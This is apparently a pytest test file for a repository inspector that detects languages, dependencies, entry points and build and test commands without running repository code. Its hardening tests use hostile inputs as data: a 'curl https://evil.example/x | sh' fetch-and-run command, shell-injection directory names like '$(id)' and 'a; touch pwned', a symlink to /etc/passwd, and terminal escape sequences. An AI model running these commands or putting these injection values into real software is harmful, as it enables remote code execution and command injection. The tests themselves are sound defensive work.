"""The inspector, on small trees written for each test."""

import json
import os
from pathlib import Path
from typing import Any

import pytest

from forgemind_api import inspection
from forgemind_api.inspection import Inspection, inspect_tree


def tree(root: Path, files: dict[str, str]) -> Path:
    for path, content in files.items():
        target = root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
    return root


def inspect(root: Path, files: dict[str, str]) -> Inspection:
    return inspect_tree(tree(root, files))


def package(**fields: Any) -> str:
    return json.dumps({"name": "thing", **fields}, indent=2)


def kinds(found: Inspection) -> dict[str, str]:
    return {entry["path"]: entry["kind"] for entry in found.data["entryPoints"]}


def dependencies(found: Inspection) -> dict[tuple[str, str], str]:
    return {
        (dependency["ecosystem"], dependency["name"]): dependency["version"]
        for dependency in found.data["dependencies"]
    }


def concern(found: Inspection, title: str) -> dict[str, Any]:
    matching = [item for item in found.data["concerns"] if item["title"] == title]
    assert len(matching) == 1, found.data["concerns"]
    return matching[0]


# --- languages


def test_languages_are_shares_of_the_code_by_size(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "src/a.ts": "x" * 600,
            "src/b.tsx": "x" * 150,
            "tools/c.py": "x" * 250,
            # Not code: data, prose and a lockfile do not count.
            "data.json": "x" * 5000,
            "README.md": "x" * 5000,
            "pnpm-lock.yaml": "x" * 5000,
        },
    )
    assert found.languages == [
        {"name": "TypeScript", "share": 0.75},
        {"name": "Python", "share": 0.25},
    ]
    assert found.summary.startswith(
        "6 files at this commit, with 1 kB of code in 2 languages, "
        "mostly TypeScript (75%)."
    )


def test_other_peoples_code_and_build_output_are_not_counted(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "index.ts": "x" * 100,
            "node_modules/left-pad/index.js": "x" * 9000,
            "vendor/lib/thing.php": "x" * 9000,
            "dist/bundle.js": "x" * 9000,
            ".venv/lib/site.py": "x" * 9000,
            # Written by a tool, wherever it is kept.
            "public/app.min.js": "x" * 9000,
            "styles/site.min.css": "x" * 9000,
        },
    )
    assert found.languages == [{"name": "TypeScript", "share": 1.0}]


def test_a_share_too_small_to_show_is_left_out(tmp_path: Path) -> None:
    found = inspect(tmp_path, {"main.go": "x" * 10_000, "run.sh": "x" * 10})
    assert found.languages == [{"name": "Go", "share": 0.999}]


def test_a_tree_without_code_says_so(tmp_path: Path) -> None:
    found = inspect(tmp_path, {"notes.txt": "hello", "LICENSE": "MIT"})
    assert found.languages == []
    assert found.summary == (
        "2 files at this commit, none in a programming language this "
        "inspection recognises. No dependency manifest was found. No test "
        "command was found. This was read from the files alone: nothing in "
        "the repository was run."
    )
    assert found.data == {
        "frameworks": [],
        "entryPoints": [],
        "modules": [],
        "dependencies": [],
        "testCommands": [],
        "buildCommands": [],
        "documentation": [],
        "concerns": [],
    }


# --- JavaScript and TypeScript


def test_a_node_service(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "package.json": package(
                packageManager="pnpm@12.1.0",
                scripts={
                    "dev": "tsx watch src/index.ts",
                    "build": "tsc -p .",
                    "test": "vitest run",
                },
                dependencies={"hono": "^4.13.0", "@acme/shared": "workspace:*"},
                devDependencies={"vitest": "^5.0.0", "typescript": "~6.0.3"},
            ),
            "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
            "src/index.ts": "import { serve } from '@hono/node-server';\n",
            "src/app.ts": "export const app = 1;\n",
            "src/worker.ts": "export {};\n",
        },
    )
    assert found.data["frameworks"] == ["Hono", "Vitest"]
    # Declared as written; a package of the same workspace is not a dependency.
    assert dependencies(found) == {
        ("npm", "hono"): "^4.13.0",
        ("npm", "vitest"): "^5.0.0",
        ("npm", "typescript"): "~6.0.3",
    }
    assert all(
        dependency["vulnerable"] is False and dependency["advisoryUrl"] is None
        for dependency in found.data["dependencies"]
    )
    assert found.data["testCommands"] == ["pnpm test"]
    assert found.data["buildCommands"] == ["pnpm build"]
    # What the dev script starts, and not a second guess beside it.
    assert kinds(found) == {"src/index.ts": "server", "src/worker.ts": "worker"}
    assert found.data["concerns"] == []


@pytest.mark.parametrize(
    ("lock", "test", "build"),
    [
        ("pnpm-lock.yaml", "pnpm test", "pnpm build"),
        ("yarn.lock", "yarn test", "yarn build"),
        ("package-lock.json", "npm test", "npm run build"),
        ("bun.lock", "bun run test", "bun run build"),
    ],
)
def test_the_lockfile_names_the_package_manager(
    tmp_path: Path, lock: str, test: str, build: str
) -> None:
    found = inspect(
        tmp_path,
        {
            "package.json": package(scripts={"test": "jest", "build": "tsc"}),
            lock: "",
        },
    )
    assert found.data["testCommands"] == [test]
    assert found.data["buildCommands"] == [build]


def test_the_placeholder_npm_writes_is_not_a_test_command(tmp_path: Path) -> None:
    manifest = package(
        scripts={"test": 'echo "Error: no test specified" && exit 1'},
        dependencies={"express": "^5.0.0"},
    )
    found = inspect(
        tmp_path,
        {"package.json": manifest, "package-lock.json": "{}", "index.js": "//"},
    )
    assert found.data["testCommands"] == []
    assert concern(found, "No test command was found")["evidence"] == [
        {"path": "package.json", "line": 3}
    ]
    assert "No test command was found." in found.summary
    # Express is a dependency, so the conventional file is taken as the server.
    assert kinds(found) == {"index.js": "server"}


def test_a_next_application_and_a_library(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "apps/web/package.json": package(
                dependencies={"next": "^16.0.0", "react": "^19.0.0"},
                scripts={"build": "next build"},
            ),
            "apps/web/src/app/layout.tsx": "export default function Layout() {}\n",
            "apps/web/src/app/page.tsx": "export default function Page() {}\n",
            "packages/kit/package.json": package(main="./dist/index.js"),
            "packages/kit/src/index.ts": "export const kit = 1;\n",
            "packages/cli/package.json": package(bin={"thing": "./dist/cli.js"}),
            "packages/cli/src/cli.ts": "#!/usr/bin/env node\n",
            "package.json": package(packageManager="pnpm@12.0.0"),
            "pnpm-lock.yaml": "",
        },
    )
    assert found.data["frameworks"] == ["Next.js", "React"]
    assert kinds(found) == {
        "apps/web/src/app/layout.tsx": "web",
        "packages/cli/src/cli.ts": "cli",
        "packages/kit/src/index.ts": "library",
    }
    # The workspace's package manager, and the directory to run it from.
    assert found.data["buildCommands"] == ["cd apps/web && pnpm build"]


def test_an_entry_point_is_a_file_of_its_own_package(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "packages/cli/package.json": package(
                bin={"thing": "../other/cli.js"}, main="../../index.js"
            ),
            "packages/other/cli.js": "#!/usr/bin/env node\n",
            "index.js": "module.exports = 1;\n",
        },
    )
    assert kinds(found) == {}


def test_a_package_that_names_no_main_is_loaded_from_its_index(
    tmp_path: Path,
) -> None:
    found = inspect(
        tmp_path,
        {
            "package.json": package(),
            "index.js": "module.exports = require('./lib/thing');\n",
            # One nobody can install is not a library, whatever it holds.
            "apps/site/package.json": package(private=True),
            "apps/site/index.js": "console.log('site');\n",
            # Exports are all a package lets in: its index is not among them.
            "packages/kit/package.json": package(exports={"./feature": "./feature.js"}),
            "packages/kit/index.js": "module.exports = 1;\n",
            "packages/kit/feature.js": "module.exports = 2;\n",
        },
    )
    assert kinds(found) == {"index.js": "library"}


# --- Python


def test_a_python_service(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "pyproject.toml": (
                "[project]\n"
                'name = "jobs"\n'
                "dependencies = [\n"
                '  "fastapi>=0.110",\n'
                "  \"celery[redis]>=5.4 ; python_version > '3.10'\",\n"
                '  "SQLAlchemy==2.0.30",\n'
                "]\n"
                "[project.scripts]\n"
                'jobs = "jobs.cli:main"\n'
                "[dependency-groups]\n"
                'dev = ["pytest>=8"]\n'
                "[build-system]\n"
                'requires = ["hatchling"]\n'
            ),
            "uv.lock": "version = 1\n",
            "src/jobs/cli.py": "def main(): ...\n",
            "src/jobs/__main__.py": "from .cli import main\n",
            "src/jobs/worker.py": "from celery import Celery\n",
            # Named like a Celery module, and nothing to do with Celery.
            "src/jobs/routes/tasks.py": "def list_tasks(): ...\n",
            "src/jobs/asgi.py": "app = None\n",
        },
    )
    assert found.data["frameworks"] == ["FastAPI", "Celery", "SQLAlchemy", "pytest"]
    assert dependencies(found) == {
        ("pypi", "fastapi"): ">=0.110",
        ("pypi", "celery"): ">=5.4",
        ("pypi", "SQLAlchemy"): "==2.0.30",
        ("pypi", "pytest"): ">=8",
    }
    assert found.data["testCommands"] == ["uv run pytest"]
    assert found.data["buildCommands"] == ["uv build"]
    assert kinds(found) == {
        "src/jobs/cli.py": "cli",
        "src/jobs/__main__.py": "cli",
        "src/jobs/asgi.py": "server",
        "src/jobs/worker.py": "worker",
    }
    assert found.data["concerns"] == []


def test_requirements_without_pins_are_a_concern_with_their_lines(
    tmp_path: Path,
) -> None:
    found = inspect(
        tmp_path,
        {
            "requirements.txt": (
                "# what the pipeline needs\n"
                "pandas>=2\n"
                "requests==2.32.0\n"
                "-r other.txt\n"
                "apache-airflow\n"
            ),
            "dags/nightly.py": "from airflow import DAG\n",
            "main.py": "print('hello')\n",
        },
    )
    assert dependencies(found) == {
        ("pypi", "pandas"): ">=2",
        ("pypi", "requests"): "==2.32.0",
        ("pypi", "apache-airflow"): "*",
    }
    assert found.data["frameworks"] == ["pandas", "Apache Airflow"]
    assert kinds(found) == {"dags/nightly.py": "worker", "main.py": "cli"}
    assert concern(found, "Dependencies are not pinned by a lockfile")["evidence"] == [
        {"path": "requirements.txt", "line": 2},
        {"path": "requirements.txt", "line": 5},
    ]
    assert concern(found, "No test command was found")["evidence"] == [
        {"path": "requirements.txt", "line": None}
    ]


def test_pinned_requirements_are_not_a_concern(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "requirements.txt": "flask==3.0.3\npytest==8.2.0\n",
            "app.py": "from flask import Flask\n",
        },
    )
    assert found.data["testCommands"] == ["pytest"]
    assert kinds(found) == {"app.py": "server"}
    assert found.data["concerns"] == []


# --- Go, Rust, PHP, Make


def test_a_go_module(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "go.mod": (
                "module example.com/gateway\n\n"
                "go 1.23\n\n"
                "require (\n"
                "\tgithub.com/go-chi/chi/v5 v5.1.0\n"
                "\tgithub.com/spf13/cobra v1.8.1\n"
                "\tgolang.org/x/sys v0.21.0 // indirect\n"
                ")\n"
            ),
            "go.sum": "",
            "cmd/gateway/main.go": 'package main\n\nimport "net/http"\n',
            "cmd/migrate/main.go": 'package main\n\nimport "github.com/spf13/cobra"\n',
        },
    )
    assert found.data["frameworks"] == ["chi", "Cobra"]
    assert dependencies(found) == {
        ("go", "github.com/go-chi/chi/v5"): "v5.1.0",
        ("go", "github.com/spf13/cobra"): "v1.8.1",
    }
    assert found.data["testCommands"] == ["go test ./..."]
    assert found.data["buildCommands"] == ["go build ./..."]
    assert kinds(found) == {
        "cmd/gateway/main.go": "server",
        "cmd/migrate/main.go": "cli",
    }
    assert found.data["concerns"] == []


def test_a_rust_crate(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "Cargo.toml": (
                '[package]\nname = "tool"\n\n'
                "[dependencies]\n"
                'clap = { version = "4.5", features = ["derive"] }\n'
                'serde = "1"\n'
                'local = { path = "../local" }\n'
            ),
            "src/main.rs": "fn main() {}\n",
            "src/lib.rs": "pub fn run() {}\n",
        },
    )
    assert found.data["frameworks"] == ["clap"]
    assert dependencies(found) == {("cargo", "clap"): "4.5", ("cargo", "serde"): "1"}
    assert found.data["testCommands"] == ["cargo test"]
    assert kinds(found) == {"src/main.rs": "cli", "src/lib.rs": "library"}
    assert concern(found, "Dependencies are not pinned by a lockfile")["evidence"] == [
        {"path": "Cargo.toml", "line": 4}
    ]


@pytest.mark.parametrize("at", ["", "engine"])
def test_a_cargo_workspace_is_tested_and_built_from_where_it_is(
    tmp_path: Path, at: str
) -> None:
    def crate(name: str, more: str = "") -> str:
        return f'[package]\nname = "{name}"\n{more}'

    def under(path: str) -> str:
        return f"{at}/{path}" if at else path

    found = inspect(
        tmp_path,
        {
            under("Cargo.toml"): (
                '[workspace]\nmembers = ["core", "cli"]\nexclude = ["./fuzz/"]\n'
            ),
            under("Cargo.lock"): "",
            under("core/Cargo.toml"): crate("core"),
            under("core/src/lib.rs"): "pub fn run() {}\n",
            under("cli/Cargo.toml"): crate("cli", '[dependencies]\nclap = "4"\n'),
            under("cli/src/main.rs"): "fn main() {}\n",
            # Left out of the workspace by name, and by being one itself.
            under("fuzz/Cargo.toml"): crate("fuzz"),
            under("fuzzy/Cargo.toml"): crate("fuzzy"),
            under("tools/gen/Cargo.toml"): crate("gen", "[workspace]\n"),
            # Beside the workspace when that is `engine`, whatever its own
            # name begins with; inside it when the workspace is everything.
            "engine-tools/Cargo.toml": crate("tools"),
        },
    )
    here = f"cd {at} && " if at else ""
    assert found.data["testCommands"] == [
        f"{here}cargo test --workspace",
        *(["cd engine-tools && cargo test"] if at else []),
        f"cd {under('fuzz')} && cargo test",
        f"cd {under('tools/gen')} && cargo test --workspace",
    ]
    assert found.data["buildCommands"] == [
        command.replace("test", "build") for command in found.data["testCommands"]
    ]
    assert kinds(found) == {
        under("cli/src/main.rs"): "cli",
        under("core/src/lib.rs"): "library",
    }
    assert dependencies(found) == {("cargo", "clap"): "4"}


def test_a_php_site(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "composer.json": json.dumps(
                {
                    "require": {"php": "^8.2", "slim/slim": "^4.14", "ext-pdo": "*"},
                    "require-dev": {"phpunit/phpunit": "^11"},
                },
                indent=2,
            ),
            "phpunit.xml": "<phpunit/>",
            "public/index.php": "<?php\n",
            "src/Router.php": "<?php\n",
        },
    )
    assert found.data["frameworks"] == ["Slim", "PHPUnit"]
    # The contract has no ecosystem for Composer, so these are `other`.
    assert dependencies(found) == {
        ("other", "slim/slim"): "^4.14",
        ("other", "phpunit/phpunit"): "^11",
    }
    assert found.data["testCommands"] == ["vendor/bin/phpunit"]
    assert kinds(found) == {"public/index.php": "web"}
    assert concern(found, "Dependencies are not pinned by a lockfile")["evidence"] == [
        {"path": "composer.json", "line": 2}
    ]


def test_make_targets_and_files_that_need_no_manifest(tmp_path: Path) -> None:
    root = tree(
        tmp_path,
        {
            "Makefile": (
                "CC := gcc\n\ntest:\n\t./run-tests\n\nbuild: deps\n\tcc main.c\n"
            ),
            "Dockerfile": "FROM scratch\n",
            "compose.yaml": "services: {}\n",
            "infra/main.tf": 'resource "x" "y" {}\n',
            ".github/workflows/ci.yml": "on: push\n",
            "install.sh": "#!/bin/sh\n",
            "bin/deploy": "#!/bin/sh\n",
            "bin/notes.txt": "not a program\n",
        },
    )
    (root / "bin/deploy").chmod(0o755)
    found = inspect_tree(root)
    assert found.data["testCommands"] == ["make test"]
    assert found.data["buildCommands"] == ["make build"]
    assert found.data["frameworks"] == [
        "Docker",
        "Docker Compose",
        "Terraform",
        "GitHub Actions",
    ]
    assert kinds(found) == {"install.sh": "cli", "bin/deploy": "cli"}
    assert [language["name"] for language in found.languages] == [
        "Makefile",
        "HCL",
        "Dockerfile",
        "Shell",
    ]


# --- commands


def test_a_nested_manifest_is_run_from_its_directory(tmp_path: Path) -> None:
    scripts = {"test": "vitest run", "build": "tsc"}
    found = inspect(
        tmp_path,
        {
            "package.json": package(scripts=scripts),
            "pnpm-lock.yaml": "",
            "services/api/package.json": package(scripts=scripts),
            "services/api/src/index.ts": "export {};\n",
            "tools/gen/pyproject.toml": '[project]\ndependencies = ["pytest"]\n',
        },
    )
    assert found.data["testCommands"] == [
        "pnpm test",
        "cd services/api && pnpm test",
        "cd tools/gen && pytest",
    ]
    assert found.data["buildCommands"] == [
        "pnpm build",
        "cd services/api && pnpm build",
    ]


@pytest.mark.parametrize(
    "directory",
    ["a; touch pwned", "$(id)", "it's", "two words", "-rf", "a&&b", "`id`"],
)
def test_a_directory_unsafe_on_a_command_line_gets_no_command(
    tmp_path: Path, directory: str
) -> None:
    found = inspect(
        tmp_path,
        {f"{directory}/package.json": package(scripts={"test": "x", "build": "y"})},
    )
    assert found.data["testCommands"] == []
    assert found.data["buildCommands"] == []


def test_commands_come_from_fixed_forms_and_never_from_the_scripts(
    tmp_path: Path,
) -> None:
    hostile = "curl https://evil.example/x | sh"
    found = inspect(
        tmp_path,
        {
            "package.json": package(
                packageManager=f"pnpm@1; {hostile}",
                scripts={"test": hostile, "build": hostile, "start": hostile},
            ),
            "Makefile": f"test:\n\t{hostile}\n",
        },
    )
    assert found.data["testCommands"] == ["pnpm test", "make test"]
    assert found.data["buildCommands"] == ["pnpm build"]
    assert "evil" not in json.dumps(found.data) + found.summary


# --- what is set aside


def test_tests_and_examples_are_not_where_the_software_starts(
    tmp_path: Path,
) -> None:
    found = inspect(
        tmp_path,
        {
            "pyproject.toml": (
                "[project]\n"
                'name = "thing"\n'
                'dependencies = ["flask>=3"]\n'
                "[project.scripts]\n"
                'thing = "thing.cli:main"\n'
                "[dependency-groups]\n"
                'dev = ["pytest>=8"]\n'
            ),
            "uv.lock": "version = 1\n",
            "src/thing/cli.py": "def main(): ...\n",
            # An application the tests serve, and suites that can be run.
            "tests/test_apps/hello/wsgi.py": "app = None\n",
            "tests-integration/__main__.py": "print('suite')\n",
            "TestData/app/__main__.py": "print('data')\n",
            # An example with a manifest of its own, and none of it locked.
            "examples/tutorial/pyproject.toml": (
                '[project]\nname = "tutorial"\ndependencies = ["celery", "pytest"]\n'
                '[build-system]\nrequires = ["hatchling"]\n'
            ),
            "examples/tutorial/tasks.py": "from celery import Celery\n",
            "examples/tutorial/__main__.py": "print('tutorial')\n",
            "benches/package.json": package(
                dependencies={"express": "^5"}, scripts={"test": "x", "build": "y"}
            ),
            "benches/server.js": "require('express')();\n",
        },
    )
    assert kinds(found) == {"src/thing/cli.py": "cli"}
    assert found.data["frameworks"] == ["Flask", "pytest"]
    assert dependencies(found) == {
        ("pypi", "flask"): ">=3",
        ("pypi", "pytest"): ">=8",
    }
    assert found.data["testCommands"] == ["uv run pytest"]
    assert found.data["buildCommands"] == []
    assert found.data["concerns"] == []
    assert "Its manifests declare 2 dependencies," in found.summary


def test_a_suite_with_a_manifest_of_its_own_is_still_how_to_test(
    tmp_path: Path,
) -> None:
    found = inspect(
        tmp_path,
        {
            "package.json": package(scripts={"build": "tsc"}),
            "package-lock.json": "{}",
            "e2e/package.json": package(
                devDependencies={"@playwright/test": "^1.60.0"},
                scripts={"test": "playwright test", "start": "node serve.js"},
                bin="./run.js",
            ),
            "e2e/run.js": "#!/usr/bin/env node\n",
            "e2e/serve.js": "require('http');\n",
        },
    )
    assert found.data["testCommands"] == ["cd e2e && npm test"]
    assert found.data["frameworks"] == ["Playwright"]
    assert dependencies(found) == {("npm", "@playwright/test"): "^1.60.0"}
    # What starts the suite does not start the software.
    assert kinds(found) == {}


def test_a_repository_of_nothing_but_examples_is_read_from_them(
    tmp_path: Path,
) -> None:
    found = inspect(
        tmp_path,
        {
            "README.md": "# Examples\n",
            "examples/hello/package.json": package(
                dependencies={"express": "^5.0.0"},
                scripts={"test": "node --test", "start": "node server.js"},
            ),
            "examples/hello/package-lock.json": "{}",
            "examples/hello/server.js": "require('express')();\n",
            "examples/hello/test/serve.js": "require('express')();\n",
            "examples/hello/test/package.json": package(bin="./serve.js"),
        },
    )
    assert found.data["testCommands"] == ["cd examples/hello && npm test"]
    assert found.data["frameworks"] == ["Express"]
    # The examples are the software here; their tests are tests all the same.
    assert kinds(found) == {"examples/hello/server.js": "server"}


# --- modules


def test_modules_are_measured_and_ranked_by_their_share(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "apps/web/src/page.tsx": "x" * 600,
            "apps/web/src/style.css": "x" * 100,
            "apps/api/main.py": "x" * 200,
            "packages/kit/index.ts": "x" * 60,
            "packages/tiny/index.ts": "x" * 10,
            "tests/test_all.py": "x" * 300,
            "docs/guide.md": "# Guide\n",
            "docs/setup.md": "# Setup\n",
            ".github/workflows/ci.yml": "on: push\n",
            "README.md": "# Thing\n",
        },
    )
    assert found.data["modules"] == [
        {
            "name": "web",
            "path": "apps/web",
            "description": "2 files, 55% of the code, mostly TypeScript.",
            "importance": "core",
        },
        {
            "name": "api",
            "path": "apps/api",
            "description": "1 file, 16% of the code, mostly Python.",
            "importance": "supporting",
        },
        # Tests are set apart by name, whatever their size.
        {
            "name": "tests",
            "path": "tests",
            "description": "1 file, 24% of the code, mostly Python.",
            "importance": "peripheral",
        },
        {
            "name": "kit",
            "path": "packages/kit",
            "description": "1 file, 5% of the code, mostly TypeScript.",
            "importance": "peripheral",
        },
        {
            "name": "tiny",
            "path": "packages/tiny",
            "description": "1 file, less than 1% of the code, mostly TypeScript.",
            "importance": "peripheral",
        },
        {
            "name": "docs",
            "path": "docs",
            "description": "2 files, none of them code.",
            "importance": "peripheral",
        },
    ]


def test_a_package_inside_src_is_opened_to_its_parts(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "src/thing/__init__.py": "x" * 10,
            "src/thing/models/a.py": "x" * 500,
            "src/thing/routes/b.py": "x" * 300,
            "src/thing/util/c.py": "x" * 30,
        },
    )
    assert [
        (module["path"], module["importance"]) for module in found.data["modules"]
    ] == [
        ("src/thing/models", "core"),
        ("src/thing/routes", "core"),
        ("src/thing/util", "peripheral"),
    ]


def test_module_paths_are_unique_and_the_list_is_bounded(tmp_path: Path) -> None:
    files = {
        f"packages/p{number:02}/index.ts": "x" * (number + 1) for number in range(40)
    }
    found = inspect(tmp_path, files)
    paths = [module["path"] for module in found.data["modules"]]
    assert len(paths) == inspection.MAX_MODULES == len(set(paths))
    assert paths[0] == "packages/p39"  # the largest first


# --- documentation


def test_documents_carry_their_own_titles(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "README.md": "<p><img src='logo.svg'></p>\n\n# The *Thing*\n",
            "CONTRIBUTING.md": "Contributing\n",
            "docs/guide.mdx": '---\ntitle: "Getting started"\n---\n\n# Ignored\n',
            "docs/api/index.rst": "API reference\n=============\n\nText.\n",
            "docs/notes.txt": "not listed\n",
            "packages/kit/README.md": "# [Kit](https://example.com) `v2`\n",
            "packages/low/README.md": "# __The__ low_level_ _kit_ **now**\n",
            ".cache/README.md": "# Hidden\n",
            "node_modules/x/README.md": "# Theirs\n",
        },
    )
    assert found.data["documentation"] == [
        {"path": "README.md", "title": "The Thing"},
        # No heading: the file's name stands in.
        {"path": "CONTRIBUTING.md", "title": "CONTRIBUTING.md"},
        {"path": "docs/guide.mdx", "title": "Getting started"},
        {"path": "docs/api/index.rst", "title": "API reference"},
        {"path": "packages/kit/README.md", "title": "Kit v2"},
        {"path": "packages/low/README.md", "title": "The low_level_ kit now"},
    ]


# --- concerns


def test_dependencies_without_a_lockfile_are_a_concern(tmp_path: Path) -> None:
    manifest = package(scripts={"test": "jest"}, dependencies={"express": "^5"})
    found = inspect(tmp_path, {"package.json": manifest})
    held = concern(found, "Dependencies are not pinned by a lockfile")
    line = manifest.splitlines().index('  "dependencies": {') + 1
    assert held["evidence"] == [{"path": "package.json", "line": line}]
    assert [item["title"] for item in found.data["concerns"]] == [held["title"]]


def test_a_lockfile_above_covers_the_packages_below(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "pnpm-lock.yaml": "",
            "package.json": package(scripts={"test": "x"}),
            "apps/web/package.json": package(dependencies={"react": "^19"}),
        },
    )
    assert found.data["concerns"] == []


@pytest.mark.parametrize(
    ("path", "content", "form"),
    [
        ("package.json", '{"dependencies": ', "JSON"),
        ("package.json", "[" * 100_000, "JSON"),
        ("package.json", '{"a": ' + "9" * 5000 + "}", "JSON"),
        ("pyproject.toml", "[project\nname = ", "TOML"),
        ("Cargo.toml", "= = =", "TOML"),
        ("composer.json", "not json", "JSON"),
    ],
)
def test_a_manifest_that_cannot_be_parsed_is_a_concern_and_not_a_failure(
    tmp_path: Path, path: str, content: str, form: str
) -> None:
    found = inspect(tmp_path, {path: content, "README.md": "# Thing\n"})
    held = concern(found, "A manifest could not be read")
    assert held["evidence"] == [{"path": path, "line": None}]
    assert f"It is not valid {form}" in held["detail"]
    assert found.data["dependencies"] == []


def test_a_manifest_too_large_to_read_whole_is_not_read_in_part(
    tmp_path: Path,
) -> None:
    manifest = package(
        description="x" * inspection.MAX_READ_BYTES,
        dependencies={"left-pad": "1.0.0"},
    )
    found = inspect(tmp_path, {"package.json": manifest, "README.md": "# Thing\n"})
    held = concern(found, "A manifest could not be read")
    assert held["evidence"] == [{"path": "package.json", "line": None}]
    assert "or is larger than the 1.0 MB read of any one file" in held["detail"]
    assert found.data["dependencies"] == []


def test_manifests_of_the_wrong_shape_are_read_as_empty(tmp_path: Path) -> None:
    found = inspect(
        tmp_path,
        {
            "package.json": json.dumps(
                {
                    "dependencies": ["not", "a", "mapping"],
                    "devDependencies": {"ok": "1", "bad": {"nested": True}, "n": 3},
                    "scripts": "nope",
                    "bin": 7,
                    "main": {"deep": {"deeper": 1}},
                    "exports": [1, 2],
                    "packageManager": {"name": "pnpm"},
                }
            ),
            "package-lock.json": "{}",
            "pyproject.toml": (
                'project = "a string"\n[tool]\npoetry = 3\n'
                '[dependency-groups]\ndev = "pytest"\n'
            ),
            "composer.json": '["a list"]',
        },
    )
    assert dependencies(found) == {("npm", "ok"): "1"}
    assert found.data["concerns"] == [
        {
            "title": "No test command was found",
            "detail": found.data["concerns"][0]["detail"],
            "evidence": [
                {"path": "composer.json", "line": None},
                {"path": "package.json", "line": 1},
                {"path": "pyproject.toml", "line": None},
            ],
        }
    ]


# --- a repository is not to be trusted


def test_links_are_never_followed(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    tree(
        outside,
        {
            "secret.md": "# The host's secret\n",
            "package.json": package(dependencies={"from-outside": "1.0.0"}),
            "code/big.py": "x" * 10_000,
        },
    )
    root = tree(tmp_path / "repo", {"main.go": "package main\n"})
    (root / "README.md").symlink_to(outside / "secret.md")
    (root / "package.json").symlink_to(outside / "package.json")
    (root / "docs").symlink_to(outside, target_is_directory=True)
    (root / "lib").symlink_to(outside / "code", target_is_directory=True)
    (root / "passwd.py").symlink_to("/etc/passwd")
    found = inspect_tree(root)
    assert found.languages == [{"name": "Go", "share": 1.0}]
    assert found.data["dependencies"] == []
    assert found.data["documentation"] == []
    assert found.data["modules"] == []
    assert found.summary.startswith("1 file at this commit")
    assert "secret" not in json.dumps(found.data) + found.summary


def test_nothing_in_the_repository_is_run(tmp_path: Path) -> None:
    marker = tmp_path / "ran"
    touch = f"open({str(marker)!r}, 'w').close()\n"
    shell = f"touch {marker}"
    root = tree(
        tmp_path / "repo",
        {
            "conftest.py": touch,
            "setup.py": touch,
            "sitecustomize.py": touch,
            "tests/conftest.py": touch,
            "manage.py": touch,
            "src/thing/__init__.py": touch,
            "src/thing/__main__.py": touch,
            "pyproject.toml": (
                '[project]\nname = "thing"\ndependencies = ["django", "pytest"]\n'
                '[project.scripts]\nthing = "thing:main"\n'
                '[build-system]\nrequires = ["setuptools"]\n'
            ),
            "package.json": package(
                scripts={
                    "preinstall": shell,
                    "postinstall": shell,
                    "prepare": shell,
                    "test": shell,
                    "build": shell,
                },
                bin={"thing": "./cli.js"},
                dependencies={"express": "^5"},
            ),
            "cli.js": f"require('fs').writeFileSync({str(marker)!r}, '')\n",
            "Makefile": f"test:\n\t{shell}\nbuild:\n\t{shell}\n",
            ".envrc": shell,
            "install.sh": f"#!/bin/sh\n{shell}\n",
        },
    )
    (root / "install.sh").chmod(0o755)
    found = inspect_tree(root)
    assert found.data["testCommands"] == ["npm test", "pytest", "make test"]
    assert not marker.exists()


def test_text_from_the_repository_is_made_safe_to_store_and_show(
    tmp_path: Path,
) -> None:
    nasty = "na\x00me‮\x1b[31m\r\nnext\tline"
    found = inspect(
        tmp_path,
        {
            "package.json": json.dumps(
                {"dependencies": {nasty: f"1.0\x00⁦{'9' * 500}"}}
            ),
            "package-lock.json": "{}",
            "requirements.txt": "flask==3.0\x00.1\n",
            "README.md": f"# Title\x00 with \x07 bells ‮gnp.exe {'long ' * 100}\n",
            "docs/a.md": "---\ntitle: \x00\x1b]0;owned\x07\n---\n",
        },
    )
    text = json.dumps(found.data, ensure_ascii=False) + found.summary
    assert not any(inspection.unicodedata.category(char)[0] == "C" for char in text)
    assert dependencies(found) == {
        ("npm", "name[31m next line"): ("1.0" + "9" * 500)[:60],
        ("pypi", "flask"): "==3.0.1",
    }
    titles = {item["path"]: item["title"] for item in found.data["documentation"]}
    assert titles["README.md"].startswith("Title with bells gnp.exe long long")
    assert len(titles["README.md"]) == 200
    assert titles["docs/a.md"] == "]0;owned"


def test_a_path_that_cannot_be_shown_is_left_out(tmp_path: Path) -> None:
    root = tree(tmp_path, {"main.py": "x" * 10})
    for name in (
        b"bad\xff.py",
        b"new\nline.py",
        b"esc\x1b[2J.py",
        b"\xe2\x80\xaertl.py",
    ):
        with open(os.path.join(os.fsencode(root), name), "wb") as handle:
            handle.write(b"x" * 1000)
    hidden = os.path.join(os.fsencode(root), b"dir\x07", b"deep")
    os.makedirs(hidden)
    with open(os.path.join(hidden, b"inner.py"), "wb") as handle:
        handle.write(b"x" * 1000)
    found = inspect_tree(root)
    assert found.languages == [{"name": "Python", "share": 1.0}]
    assert found.summary.startswith("1 file at this commit, with 10 bytes of code")
    assert found.data["modules"] == []


def test_what_is_listed_is_bounded(tmp_path: Path) -> None:
    files: dict[str, str] = {
        "package.json": package(
            scripts={"test": "x", "build": "y"},
            dependencies={f"dep-{number:04}": "1.0.0" for number in range(1000)},
        ),
        "package-lock.json": "{}",
    }
    for number in range(60):
        files[f"services/s{number:02}/package.json"] = package(
            scripts={"test": "x", "build": "y", "start": "node main.js"},
            bin="./cli.js",
        )
        files[f"services/s{number:02}/main.js"] = "//\n"
        files[f"services/s{number:02}/cli.js"] = "//\n"
        files[f"docs/page-{number:02}.md"] = f"# Page {number}\n"
    found = inspect(tmp_path, files)
    data = found.data
